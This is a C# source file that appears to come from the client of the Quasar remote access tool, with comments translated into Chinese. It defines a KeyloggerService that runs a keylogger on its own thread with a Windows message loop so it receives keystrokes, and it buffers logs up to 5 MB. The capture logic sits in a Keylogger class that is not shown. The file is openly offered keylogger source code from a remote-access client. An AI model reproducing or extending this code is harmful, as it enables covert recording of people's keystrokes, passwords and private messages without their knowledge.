﻿using System;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client.Logging
{
    /// <summary>
    /// 提供运行键盘记录器的服务。
    /// </summary>
    public class KeyloggerService : IDisposable
    {
        /// <summary>
        /// 包含执行的键盘记录器和消息循环的线程。
        /// </summary>
        private readonly Thread _msgLoopThread;
        
        /// <summary>
        /// 接收按键事件所需的消息循环。
        /// </summary>
        private ApplicationContext _msgLoop;
        
        /// <summary>
        /// 提供键盘记录功能。
        /// </summary>
        private Keylogger _keylogger;

        /// <summary>
        /// 初始化 <see cref="KeyloggerService"/> 的新实例。
        /// </summary>
        public KeyloggerService()
        {
            _msgLoopThread = new Thread(() =>
            {
                _msgLoop = new ApplicationContext();
                _keylogger = new Keylogger(15000, 5 * 1024 * 1024);
                _keylogger.Start();
                Application.Run(_msgLoop);
            });
        }

        /// <summary>
        /// 启动键盘记录器和消息循环。
        /// </summary>
        public void Start()
        {
            _msgLoopThread.Start();
        }

        /// <summary>
        /// 释放与此键盘记录器服务关联的所有托管和非托管资源。
        /// </summary>
        public void Dispose()
        {
            Dispose(true);
            GC.SuppressFinalize(this);
        }

        protected void Dispose(bool disposing)
        {
            if (disposing)
            {
                _keylogger.Dispose();
                _msgLoop.ExitThread();
                _msgLoop.Dispose();
            }
        }
    }
}
